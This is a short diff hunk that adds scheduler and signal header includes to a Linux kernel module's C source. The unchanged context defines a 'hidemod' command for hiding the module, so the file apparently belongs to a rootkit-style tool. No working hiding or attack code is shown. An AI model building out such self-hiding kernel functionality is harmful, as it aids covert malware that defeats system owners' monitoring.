@@ -11,6 +11,9 @@
 #include <linux/inet.h>
 #include <linux/delay.h>
 #include <linux/timer.h>
+#include <linux/sched.h>
+#include <linux/sched/signal.h>
+
 
 /* commands */
 #define CMD_HIDE_MODULE "hidemod"
